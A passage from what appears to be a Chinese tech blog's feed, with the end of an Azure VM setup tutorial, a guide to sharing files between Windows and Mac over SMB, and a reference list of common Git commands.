src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812143437.png" alt=""></p><p>点击添加。</p><p>配置IP 基本信息，然后点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812143641.png" alt=""></p><p>此时，只是创建了内网IP，并没有与外网IP 地址进行关联，</p><p>点击刚才新建的公共 IP 地址，点击配置。</p><p>资源类型选择网络接口，网络接口与对应的实例进行关联。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812153504.png" alt=""></p><p>关联成功之后，就可以进行连接了。</p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><ol><li>打开终端</li><li>请确保你对私钥具有只读访问权限。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 &lt;私钥&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>运行以下示例命令以连接到 VM。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i &lt;私钥路径&gt; user@ip_address</span><br></pre></td></tr></table></figure><ul><li><code>user</code>：表示VM 用户</li><li><code>ip_address</code>：表示外网IP 地址</li></ul><h3 id="扩大默认磁盘大小"><a href="#扩大默认磁盘大小" class="headerlink" title="扩大默认磁盘大小"></a>扩大默认磁盘大小</h3><p>上面简单提到过，如果想要扩大默认磁盘的大小，有两种方式：</p><ol><li>添加新磁盘。这种方式需要手动挂载，如果对linux 并不熟悉，这种方式不推荐新手用户使用。</li><li>更改默认磁盘大小。</li></ol><p>第二种方式并不能直接更改，需要先将服务器停掉（注意⚠️：不是删除）。</p><p>搜索磁盘，点击第一个搜索结果。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812145110.png" alt=""></p><p>点击需要扩大的磁盘实例，注意：只能扩大，不能缩小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812145326.png" alt=""></p><p>然后点击保存即可。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此，就已经完成了Azure 的创建了，这方面需要学习的还有很多，这里只是简单的整理了一下自己遇到的问题。</p><p>有些地方可能没说清楚，但如果能帮到你那真是太好了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。&lt;/p&gt;
&lt;p&gt;一是方便自己以后回顾，二是给其他人作为参考。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Linux/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="云" scheme="https://www.0x2beace.com/tags/%E4%BA%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows 和 Mac 在局域网内如何共享文件？</title>
    <link href="https://www.0x2beace.com/how-do-windows-and-mac-share-files-in-the-local-area-network/"/>
    <id>https://www.0x2beace.com/how-do-windows-and-mac-share-files-in-the-local-area-network/</id>
    <published>2020-08-11T14:11:18.000Z</published>
    <updated>2020-08-13T11:43:07.419Z</updated>
    
    <content type="html"><![CDATA[<p>每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。<br>如果碰到了大一点的文件，就得换成网盘或者移动硬盘。</p><p>身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>这里准备的是用 Windows 作为主机创建共享文件。</p><p>首先要确认准备传输文件的 Windows 和 Mac 是在同一个路由器组成的局域网内。</p><p>然后打开 Windows 的文件资源管理器，在其根目录下创建一个共享文件夹，名称随意，自己知道就好了。</p><p>右键文件夹，点击属性，找到 共享 Tab，点击高级共享。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220638.png" alt=""></p><p>勾选共享此文件夹，点击确定。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220726.png" alt=""></p><p>然后回到共享文件夹，右键点击属性，找到共享，选择用户。</p><p>如果允许其他人写入，则选择 Everyone，更改为：读取/写入。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220755.png" alt=""></p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><h3 id="Windows-本机访问"><a href="#Windows-本机访问" class="headerlink" title="Windows 本机访问"></a>Windows 本机访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ComputerName 表示：你的计算机名称</span><br><span class="line"># ShareFolders 表示：共享文件夹名称</span><br><span class="line">file:&#x2F;&#x2F;ComputerName&#x2F;ShareFolders&#x2F;</span><br></pre></td></tr></table></figure><h3 id="Mac-局域网访问"><a href="#Mac-局域网访问" class="headerlink" title="Mac 局域网访问"></a>Mac 局域网访问</h3><p>Mac 有两种方式：</p><ol><li>通过浏览器访问</li><li>通过访达访问，使用快捷键 <code>⌘ + k</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ComputerName 表示：需要访问的计算机名称</span><br><span class="line"># ShareFolders 表示：共享文件夹名称</span><br><span class="line">smb:&#x2F;&#x2F;ConputerName&#x2F;ShareFolders&#x2F;</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220823.png" alt=""></li></ol><p>通过验证之后，就能访问到共享文件夹了。</p><p>到这里应该就能顺利的在两个或多个电脑之间传输文件了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220855.png" alt=""></p><p>如果还不能访问，可以ping 一下对方的主机，如果没有ping通，检查一下防火墙设置。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200811220920.png" alt=""></p><p>如果防火墙关着，那么会 ping 不通。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200813193747.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/32026197" target="_blank" rel="noopener">Windows 和 Mac 在局域网内如何共享文件？</a></li><li><a href="https://blog.csdn.net/sscssz/article/details/50057759" target="_blank" rel="noopener">共享文件夹 一个实现Windows和Mac之间文件互传的简单方法</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;每当手上有两台或多台电脑时，如果想传送一个文件，第一个想到的就是微信、QQ等这类工具。&lt;br&gt;如果碰到了大一点的文件，就得换成网盘或者移动硬盘。&lt;/p&gt;
&lt;p&gt;身为一个做开发者，这种做法比较low，所以找了几篇文章学习到了如何在局域网内共享文件。&lt;/p&gt;</summary>
    
    
    
    <category term="Skill" scheme="https://www.0x2beace.com/categories/Skill/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/categories/Skill/Windows/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/categories/Skill/Windows/Mac/"/>
    
    
    <category term="Skill" scheme="https://www.0x2beace.com/tags/Skill/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/tags/Windows/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>Git 常用命令参考手册</title>
    <link href="https://www.0x2beace.com/git-common-command-reference-manual/"/>
    <id>https://www.0x2beace.com/git-common-command-reference-manual/</id>
    <published>2020-08-11T01:22:19.000Z</published>
    <updated>2020-08-11T01:24:32.528Z</updated>
    
    <content type="html"><![CDATA[<p>虽然每天都在使用<code>Git</code>，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些<code>Git</code> 常用命令。</p><a id="more"></a><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><p>Git的设置文件为<code>.gitconfig</code>，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 查看全局配置列表</span><br><span class="line">$ git config --global --list</span><br><span class="line"># 查看局部配置列表</span><br><span class="line">$ git config --local --list</span><br><span class="line"></span><br><span class="line"># 设置全局用户名&#x2F;邮箱</span><br><span class="line">$ git config --global user.name &quot;yourName&quot;</span><br><span class="line">$ git config --global user.email &quot;example@example.com&quot;</span><br><span class="line"></span><br><span class="line"># 设置本地当前工作区仓库用户名&#x2F;邮箱</span><br><span class="line">$ git config --local user.name &quot;yourName&quot;</span><br><span class="line">$ git config --local user.email &quot;example@example.com&quot;</span><br><span class="line"></span><br><span class="line"># 将默认文本编辑器设置为 emacs&#x2F;vim</span><br><span class="line">$ git config --global core.editor emacs&#x2F;vim</span><br><span class="line"></span><br><span class="line"># 编辑当前仓库的配置文件</span><br><span class="line">$ git config -e  # 等价与 vim .git&#x2F;config</span><br><span class="line"># 编辑全局配置文件</span><br><span class="line">$ git config --global -e</span><br></pre></td></tr></table></figure><h3 id="命令别名配置"><a href="#命令别名配置" class="headerlink" title="命令别名配置"></a>命令别名配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 添加别名 git st &#x3D; git status</span><br><span class="line">$ git config --global alias.st status</span><br><span class="line"></span><br><span class="line"># 删除 st 别名</span><br><span class="line">$ git config --global --unset alias.st</span><br><span class="line"></span><br><span class="line"># 执行外部命令, 只要在前面加 ! 即可</span><br><span class="line">$ git config --global alias.st &#39;!echo hello&#39;;</span><br></pre></td></tr></table></figure><h3 id="代理配置"><a href="#代理配置" class="headerlink" title="代理配置"></a>代理配置</h3><p>如果想知道关于<code>Git</code>配置代理的更多信息，可以查阅<a href="https://github.com/0xAiKang/Note/blob/master/Skill/Git%20Clone%20%E5%A4%AA%E6%85%A2%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F.md" target="_blank" rel="noopener">这篇笔记</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 配置HTTP&#x2F;HTTPS 代理</span><br><span class="line">$ git config --global https.proxy  http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line">$ git config --global http.proxy  http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line"></span><br><span class="line"># 查看</span><br><span class="line">$ git config --global --get http.proxy</span><br><span class="line">$ git config --global --get https.proxy</span><br><span class="line"></span><br><span class="line"># 取消代理</span><br><span class="line">$ git config --global --unset http.proxy</span><br><span class="line">$ git config --global --unset https.proxy</span><br></pre></td></tr></table></figure><h3 id="生成SSHKey"><a href="#生成SSHKey" class="headerlink" title="生成SSHKey"></a>生成SSHKey</h3><p>关于如何配置<code>ssh config</code> 可以查阅<a href="https://github.com/0xAiKang/Note/blob/master/Git/%E9%80%9A%E8%BF%87SSH%20Config%20%E9%85%8D%E7%BD%AE%20Git%20SSH%20%E5%8D%8F%E8%AE%AE.md" target="_blank" rel="noopener">这篇笔记</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 将ssh key生成在默认下，也就是&#96;~&#x2F;.ssh&#x2F;id_rsa&#96;。</span><br><span class="line">$ ssh-keygen -t rsa -C &quot;youremail&quot;</span><br><span class="line"></span><br><span class="line"># 将ssh key生成在指定路径下的指定文件名中</span><br><span class="line">$ ssh-keygen -t rsa  -f ~&#x2F;.ssh&#x2F;id_rsa_bitbucket -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 在当前目录新建一个Git代码库</span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"># 新建一个目录，将其初始化为Git代码库</span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"># 下载一个项目和它的整个代码历史</span><br><span class="line">$ git clone [url] [project-name]</span><br><span class="line"></span><br><span class="line"># 浅克隆, 历史记录只克隆最后一条, 减少克隆时间</span><br><span class="line">$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git</span><br></pre></td></tr></table></figure><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><p>基础操作中的命令都是日常使用频率非常高的。</p><h3 id="文件状态"><a href="#文件状态" class="headerlink" title="文件状态"></a>文件状态</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看工作区状态</span><br><span class="line">$ git status</span><br><span class="line"></span><br><span class="line"># 列出没有被 .gitignore 忽略的文件列表</span><br><span class="line">$ git status --ignored</span><br><span class="line"></span><br><span class="line"># 列出没有被 .gitignore 忽略的文件列表</span><br><span class="line">$ git ls-files</span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 暂存所有</span><br><span class="line">$ git add -A</span><br><span class="line"></span><br><span class="line"># 暂存某个文件</span><br><span class="line">$ git add .&#x2F;README.md</span><br><span class="line"></span><br><span class="line"># 添加当前目录的所有文件到暂存区    </span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line"># 暂存一系列文件</span><br><span class="line">$ git add 1.txt 2.txt ...</span><br><span class="line"></span><br><span class="line"># 从暂存区中删除文件（git add 的反向操作）</span><br><span class="line">$ git rm [file] </span><br><span class="line"></span><br><span class="line"># 暂存区、工作区一起删除</span><br><span class="line">$ git rm -f [file]</span><br><span class="line"></span><br><span class="line"># 停止追踪指定文件，但该文件会保留在工作区</span><br><span class="line">$ git rm --cached [file]</span><br></pre></td></tr></table></figure><h3 id="查看文件改动"><a href="#查看文件改动" class="headerlink" title="查看文件改动"></a>查看文件改动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有文件改动</span><br><span class="line">$ git diff</span><br><span class="line"></span><br><span class="line"># 查看具体文件的改动</span><br><span class="line">$ git diff README.md</span><br><span class="line"></span><br><span class="line"># 查看指定 commit-id 改动内容</span><br><span class="line">$ git diff [commit-id]</span><br><span class="line"></span><br><span class="line"># 对比工作区和版本库里的最新版本有什么区别</span><br><span class="line">$ git diff HEAD --[file-name]</span><br><span class="line"></span><br><span class="line"># 查看某个文件的历史修改记录</span><br><span class="line">$ git log README.md</span><br><span class="line">$ git show [commit-id] README.md</span><br></pre></td></tr></table></figure><h3 id="撤销与回滚"><a href="#撤销与回滚" class="headerlink" title="撤销与回滚"></a>撤销与回滚</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 恢复暂存区的指定文件到工作区</span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line"># 恢复暂存区的所有文件到工作区</span><br><span class="line">$ git checkout .</span><br><span class="line"></span><br><span class="line"># 重置暂存区与工作区，与上一次commit保持一致</span><br><span class="line">$ git reset --hard</span><br><span class="line"></span><br><span class="line"># 回滚上一个版本</span><br><span class="line">$ git reset --hard HEAD^</span><br><span class="line"></span><br><span class="line"># 回退到指定版本（会重置暂存区与工作区）</span><br><span class="line">$ git reset --hard [commit-id]</span><br><span class="line"></span><br><span class="line"># 回退到指定版本（不会重置暂存区与工作区，会回到该版本的暂存状态）</span><br><span class="line">$ git reset --soft [commit-id]</span><br></pre></td></tr></table></figure><h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 提交暂存区到本地仓库</span><br><span class="line">$ git commit -m [message]</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到本地仓库</span><br><span class="line">git commit README.md -m [message]</span><br><span class="line"></span><br><span class="line"># 提交并显示diff变化</span><br><span class="line">git commit -v</span><br><span class="line"></span><br><span class="line"># 重写上一次的提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line">$ git commit --amend -m [message]</span><br></pre></td></tr></table></figure><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 查看完整历史提交记录</span><br><span class="line">$ git log</span><br><span class="line"></span><br><span class="line"># 查看前n 条记录</span><br><span class="line">$ git log -n</span><br><span class="line"></span><br><span class="line"># 以图形方式查看完整历史提交记录</span><br><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line"></span><br><span class="line"># 通过commit log 进行搜索</span><br><span class="line">$ git log -i --grep&#x3D;&quot;fire bug&quot;</span><br><span class="line"></span><br><span class="line"># 列出提交者贡献数量, 只会打印作者和贡献数量</span><br><span class="line">$ git shortlog -sn</span><br><span class="line"></span><br><span class="line"># 以提交贡献数量排序并打印出信息</span><br><span class="line">$ git shortlog -n</span><br><span class="line"></span><br><span class="line"># 采用邮箱格式化的方式进行查看贡献度</span><br><span class="line">$ git shortlog -e</span><br></pre></td></tr></table></figure><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># 查看本地分支</span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"># 查看所有分支</span><br><span class="line">git branch -a</span><br><span class="line"></span><br><span class="line"># 查看本地分支所关联的远程分支</span><br><span class="line">git branch -vv</span><br><span class="line"></span><br><span class="line"># 查看本地 master 分支创建时间</span><br><span class="line">git reflog show --date&#x3D;iso master</span><br><span class="line"></span><br><span class="line"># 新建一个分支，但依然停留在当前分支</span><br><span class="line">$ git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，并切换到该分支</span><br><span class="line">$ git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向指定commit</span><br><span class="line">$ git branch [branch] [commit-id]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，与指定的远程分支建立追踪关系</span><br><span class="line">$ git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 切换到指定分支，并更新工作区</span><br><span class="line">$ git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"># 建立追踪关系，在现有分支与指定的远程分支之间</span><br><span class="line">$ git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 合并指定分支到当前分支</span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"># 选择一个commit，合并进当前分支</span><br><span class="line">$ git cherry-pick [commit-id]</span><br><span class="line"></span><br><span class="line"># 删除指定分支</span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># 强制删除指定分支</span><br><span class="line">$ git branch -D [branch-name]</span><br><span class="line"></span><br><span class="line"># 删除远程分支</span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote&#x2F;branch]</span><br></pre></td></tr></table></figure><h3 id="远程仓库管理"><a href="#远程仓库管理" class="headerlink" title="远程仓库管理"></a>远程仓库管理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 查看远程仓库（默认是origin，这是git 会使用的默认名称）</span><br><span class="line">$ git remote </span><br><span class="line"></span><br><span class="line"># 指定-v, 查看所有远程仓库地址</span><br><span class="line">$ git remote -v</span><br><span class="line"></span><br><span class="line"># 添加一个新的远程仓库</span><br><span class="line">$ git remote add [origin-name] https:&#x2F;&#x2F;github.com&#x2F;0xAiKang&#x2F;Note.git</span><br><span class="line"></span><br><span class="line"># 查看指定远程仓库的详情信息</span><br><span class="line">$ git remote show [origin-name]</span><br><span class="line"></span><br><span class="line"># 重命名远程仓库</span><br><span class="line">$ git remote rename [old-name] [new-name]</span><br><span class="line"></span><br><span class="line"># 移除远程仓库</span><br><span class="line">$ git remote remove [origin-name]</span><br></pre></td></tr></table></figure><h3 id="Push"><a href="#Push" class="headerlink" title="Push"></a>Push</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 默认推送当前分支</span><br><span class="line">$ git push</span><br><span class="line"></span><br><span class="line"># 推送内容到主分支，并建立追踪关系</span><br><span class="line">$ git push -u origin master</span><br><span class="line"></span><br><span class="line"># 将本地分支推送到指定远程分支， （本地分支:远程分支）</span><br><span class="line">$ git push origin [branch]:[branch]</span><br><span class="line"></span><br><span class="line"># 强行推送当前分支到远程仓库，即使有冲突</span><br><span class="line">$ git push -f</span><br></pre></td></tr></table></figure><h3 id="Pull"><a href="#Pull" class="headerlink" title="Pull"></a>Pull</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 取回默认远程仓库的变化，并自动与本地分支合并</span><br><span class="line">$ git pull</span><br><span class="line"></span><br><span class="line"># 取回指定远程仓库的变化，并自动与本地指定分支合并（远程分支名:本地分支名）</span><br><span class="line">$ git pull [remote] [branch]:[branch]</span><br><span class="line"></span><br><span class="line"># 取回指定远程仓库的变化，并自动与本地当前分支合并</span><br><span class="line">$ git pull origin master</span><br><span class="line"></span><br><span class="line"># 取回远程仓库的所有变动，但是不会自动与本地当前分支合并</span><br><span class="line">$ git fetch</span><br></pre></td></tr></table></figure><h2 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h2><p>进阶操作中的命令是一些很实用，但可能不常使用，所以把它们单独拎出来。</p><h3 id="cherry-pick"><a href="#cherry-pick" class="headerlink" title="cherry-pick"></a>cherry-pick</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 选择一个commit，合并进当前分支</span><br><span class="line">$ git cherry-pick [commit-id]</span><br><span class="line"></span><br><span class="line"># 保留原有作者信息进行提交</span><br><span class="line">$ git cherry-pick -x [commit-id]</span><br></pre></td></tr></table></figure><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 将当前的工作区隐藏</span><br><span class="line">$ git stash</span><br><span class="line"></span><br><span class="line"># 恢复隐藏的工作区，并将此次隐藏记录从隐藏列表中移出</span><br><span class="line">$ git stash pop</span><br><span class="line"></span><br><span class="line"># 恢复隐藏的工作区，保留此次隐藏记录</span><br><span class="line">$ git stash apply</span><br><span class="line"></span><br><span class="line"># 查看当前隐藏列表</span><br><span class="line">$ git stash list</span><br></pre></td></tr></table></figure><h3 id="Blame"><a href="#Blame" class="headerlink" title="Blame"></a>Blame</h3><p><code>git blame</code> 用于查看某个文件的修改历史记录是哪个作者进行了改动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看 README.md 文件的修改历史记录，包括时间、作者以及内容</span><br><span class="line">$ git blame README.md</span><br><span class="line"></span><br><span class="line"># 查看谁改动了 README.md 文件的 11行-12行</span><br><span class="line">$ git blame -L 11,12 README.md</span><br><span class="line"></span><br><span class="line"># 查看谁改动了 README.md 文件11行以后</span><br><span class="line">$ git blame -L 11 README.md</span><br></pre></td></tr></table></figure><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 